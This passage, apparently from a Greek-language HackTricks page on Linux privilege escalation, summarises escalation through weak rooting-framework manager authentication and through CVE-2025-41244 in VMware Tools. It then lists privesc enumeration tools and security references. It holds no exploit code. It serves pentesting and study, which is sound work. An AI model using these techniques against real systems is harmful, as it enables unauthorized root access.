Τα Android rooting frameworks συνήθως κάνουν hook σε ένα syscall για να εκθέσουν προνομιούχες λειτουργίες του kernel σε έναν userspace manager. Η αδύναμη αυθεντικοποίηση του manager (π.χ. έλεγχοι υπογραφής που βασίζονται στη σειρά των FD ή αδύναμα σχήματα κωδικών πρόσβασης) μπορεί να επιτρέψει σε μια τοπική εφαρμογή να προσποιηθεί ότι είναι ο manager και να αποκτήσει root σε συσκευές που έχουν ήδη γίνει root. Μάθετε περισσότερα και δείτε λεπτομέρειες για το exploitation εδώ:


{{#ref}}
../../software-information/android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## Εντοπισμός υπηρεσίας VMware Tools και LPE (CWE-426) μέσω exec βασισμένου σε regex (CVE-2025-41244)

Ο εντοπισμός υπηρεσιών μέσω regex στο VMware Tools/Aria Operations μπορεί να εξαγάγει μια διαδρομή binary από τις γραμμές εντολών διεργασιών και να την εκτελέσει με -v σε προνομιούχο περιβάλλον. Ελαστικά patterns (π.χ. αυτά που χρησιμοποιούν \S) μπορεί να ταιριάξουν με listeners που έχει τοποθετήσει ο επιτιθέμενος σε εγγράψιμες τοποθεσίες (π.χ. /tmp/httpd), οδηγώντας σε εκτέλεση ως root (CWE-426 Untrusted Search Path).<sup>[[27]](#references)</sup>

Μάθετε περισσότερα και δείτε ένα γενικευμένο μοτίβο που εφαρμόζεται και σε άλλα stacks εντοπισμού/παρακολούθησης εδώ:

{{#ref}}
../../main-system-information/kernel-lpe-cves/vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Προστασίες ασφάλειας του Kernel

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Περισσότερη βοήθεια

[Static binaries του impacket](https://github.com/ropnop/impacket_static_binaries)

## Εργαλεία Privesc για Linux/Unix

### **Καλύτερο εργαλείο για την αναζήτηση vectors τοπικής κλιμάκωσης προνομίων στο Linux:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(επιλογή -t)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Καταγραφή kernel ευπαθειών σε Linux και MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (φυσική πρόσβαση):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Συλλογή περισσότερων scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [1] [0xdf – HTB Planning (κλιμάκωση προνομίων μέσω διεπαφής Crontab, επαναχρησιμοποίηση διαπιστευτηρίων zip -P)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [2] [0xdf – HTB Era: πλαστό payload .text_sig για monitor που εκτελείται από cron](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [3] [0xdf – Holiday Hack Challenge 2025: παράκαμψη Neighborhood Watch (υφαρπαγή PATH μέσω sudo env_keep)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [4] [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [5] [Βασική κλιμάκωση προνομίων στο Linux](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [6] [Οδηγός κλιμάκωσης προνομίων στο Linux](https://payatu.com/guide-linux-privilege-escalation/)
- [7] [Επίθεση και άμυνα: τεχνικές κλιμάκωσης προνομίων στο Linux το 2016](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [8] [Κανείς δεν περιμένει την εκτέλεση εντολών!](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [9] [Sudo (LD_PRELOAD) (κλιμάκωση προνομίων στο Linux)](https://touhidshaikh.com/blog/?p=827)
- [10] [lpeworkshop – Οδηγός ασκήσεων εργαστηρίου - Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [11] [frizb/Linux-Privilege-Escalation: Συμβουλές και κόλπα για κλιμάκωση προνομίων στο Linux](https://github.com/frizb/Linux-Privilege-Escalation)
- [12] [lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [13] [rtcrowley/linux-private-i: Εργαλείο απογραφής και κλιμάκωσης προνομίων στο Linux](https://github.com/rtcrowley/linux-private-i)
- [14] [Τι είναι ένα Socket;](https://www.linux.com/news/what-socket/)
- [15] [Peppo (Proving Grounds) writeup](https://muzec0318.github.io/posts/PG/peppo.html)
- [16] [Γνωρίστε το D-BUS](https://www.linuxjournal.com/article/7744)
- [17] [Εκτελέσιμα SUID και κλιμάκωση προνομίων στο Linux](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [18] [Sudo Μέρος 2 – Κλιμάκωση προνομίων στο Linux](https://juggernaut-sec.com/sudo-part-2-lpe)
- [19] [Πώς να διαχειρίζεστε ACLs στο Linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [20] [Root σε Redhat/CentOS μέσω network-scripts](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [21] [Τι είναι το systemd;](https://www.linode.com/docs/guides/what-is-systemd/)
- [22] [0xdf – HTB Eureka (bash arithmetic injection μέσω logs, συνολική αλυσίδα)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [23] [Εγχειρίδιο GNU Bash – BASH_ENV (αρχείο εκκίνησης για μη διαδραστικές συνεδρίες)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [24] [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [25] [0xdf – HTB Previous (sudo terraform dev_overrides + κλιμάκωση προνομίων μέσω symlink TF_VAR)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [26] [0xdf – HTB Slonik (αντιγραφή pg_basebackup από cron → SUID bash)](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
- [27] [NVISO – Όπως κι αν το ονομάσετε, η VMware το ανυψώνει (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)
- [28] [Stratascale – CVE-2025-32463: Κλιμάκωση προνομίων μέσω Sudo Chroot](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)
- [29] [Rich Mirch – Ευπάθειες κλιμάκωσης προνομίων στο Sudo CVE-2025-32462 και CVE-2025-32463](https://blog.mirch.io/sudo-elevation-of-privilege-vulnerabilities/)
- [30] [0xdf – HTB: Browsed](https://0xdf.gitlab.io/2026/03/28/htb-browsed.html)
- [31] [PEP 3147 – Κατάλογοι αποθετηρίου PYC](https://peps.python.org/pep-3147/)
- [32] [Τεκμηρίωση Python importlib](https://docs.python.org/3/library/importlib.html)
- [33] [polkit/polkit issue #74](https://gitlab.freedesktop.org/polkit/polkit/issues/74)
- [34] [mirchr/security-research](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh)
- [35] [Tweet από τον @paragonsec](https://twitter.com/paragonsec/status/1071152249529884674)
- [36] [redsiege.com - Καταγραφή κωδικών πρόσβασης στο Linux](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux)
- [37] [tech.feedyourhead.at - Λεπτομέρειες μιας συνθήκης ανταγωνισμού στο Logrotate](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition)
- [38] [Τεκμηρίωση Python 3.10 – `site` και αρχεία διαμόρφωσης διαδρομών](https://docs.python.org/3.10/library/site.html)
- [39] [0xdf – HTB: SmartHire](https://0xdf.gitlab.io/2026/09/26/htb-smarthire.html)
{{#include ../../../banners/hacktricks-training.md}}
